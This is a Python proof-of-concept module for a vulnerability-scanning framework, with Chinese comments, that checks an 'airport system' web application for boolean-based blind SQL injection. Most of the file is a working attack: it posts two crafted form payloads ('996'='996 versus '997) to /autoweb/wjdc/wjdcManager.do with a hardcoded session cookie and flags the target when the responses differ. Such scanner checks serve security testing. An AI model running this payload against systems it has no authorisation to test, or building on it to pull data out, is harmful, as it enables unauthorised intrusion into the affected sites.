# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Mlairport_0101'  # 平台漏洞编号
    name = '航空系统MYSQL存在SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-20'  # 漏洞公布时间
    desc = '''
    航空系统MYSQL存在SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205585
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Mlairport'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9d825efb-fdbe-4e07-a1e8-10f1265af80e'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/autoweb/wjdc/wjdcManager.do"
            payload = "col1=1'AND '996'='996&col10=%b7%c7%b3%a3%c2%fa%d2%e2&col11=%b7%c7%b3%a3%c2%fa%d2%e2&col12=%b7%c7%b3%a3%c2%fa%d2%e2&col13=%b7%c7%b3%a3%c2%fa%d2%e2&col14=%b7%c7%b3%a3%c2%fa%d2%e2&col15=%b7%c7%b3%a3%c2%fa%d2%e2&col16=%b7%c7%b3%a3%c2%fa%d2%e2&col17=%b7%c7%b3%a3%c2%fa%d2%e2&col2=1&col3=1&col4=1&col5=%ca%c7&col6=%bb%fa%b3%a1%b0%cd%ca%bf&col7=%ca%c7&col8=%b7%c7%b3%a3%c2%fa%d2%e2&col9=%b7%c7%b3%a3%c2%fa%d2%e2&ipaddress=124.114.77.180&method=saveWjAction&state=&times=2016-03-15%2003:54:26&webname=syfh"
            payload1 = "col1=1'AND '996'='997&col10=%b7%c7%b3%a3%c2%fa%d2%e2&col11=%b7%c7%b3%a3%c2%fa%d2%e2&col12=%b7%c7%b3%a3%c2%fa%d2%e2&col13=%b7%c7%b3%a3%c2%fa%d2%e2&col14=%b7%c7%b3%a3%c2%fa%d2%e2&col15=%b7%c7%b3%a3%c2%fa%d2%e2&col16=%b7%c7%b3%a3%c2%fa%d2%e2&col17=%b7%c7%b3%a3%c2%fa%d2%e2&col2=1&col3=1&col4=1&col5=%ca%c7&col6=%bb%fa%b3%a1%b0%cd%ca%bf&col7=%ca%c7&col8=%b7%c7%b3%a3%c2%fa%d2%e2&col9=%b7%c7%b3%a3%c2%fa%d2%e2&ipaddress=124.114.77.180&method=saveWjAction&state=&times=2016-03-15%2003:54:26&webname=syfh"
            headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                "Accept-Encoding": "gzip, deflate",
                "Cookie": "JSESSIONID=DAAC0D318E4F44595A4C3D6DE2F103EC",
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": "483"
            }
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url, data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
